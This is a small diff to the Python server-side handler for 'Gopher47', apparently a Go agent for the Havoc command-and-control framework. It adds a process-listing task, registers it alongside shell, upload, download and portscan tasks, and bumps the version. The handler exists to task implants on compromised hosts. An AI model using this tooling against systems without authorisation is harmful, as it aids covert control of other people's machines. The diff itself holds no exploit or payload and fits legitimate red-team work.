@@ -66,6 +66,19 @@ class CommandLs(Command):
         Task.add_data("ls " + arguments['directory'])
         return Task.buffer
 
+class CommandPs(Command):
+    Name        = "ps"
+    Description = "Gets a list of the currently running processes"
+    Help        = "ps"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_data("ps")
+        return Task.buffer
+
 class CommandUpload(Command):
     Name = "upload"
     Description = "Upload a file. Specify full path to destination."
@@ -216,7 +229,7 @@ class CommandExit(Command):
 class Gopher47(AgentType):
     Name = "Gopher47"
     Author = "@An00bRektn"
-    Version = "0.2"
+    Version = "0.5"
     Description = f"""Golang 3rd party agent for Havoc, version {Version}"""
     MagicValue = 0x676f676f # "gogo", only ASCII printable magic bytes allowed
 
@@ -247,6 +260,7 @@ class Gopher47(AgentType):
         CommandShell(),
         CommandKill(),
         CommandLs(),
+        CommandPs(),
         CommandUpload(),
         CommandDownload(),
         CommandPortscan(),
@@ -257,7 +271,6 @@ class Gopher47(AgentType):
 
     # Stolen from https://github.com/susMdT/SharpAgent/blob/main/handler.py
     def generate( self, config: dict ) -> None:
-        #print(config)
         # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
         self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
         self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
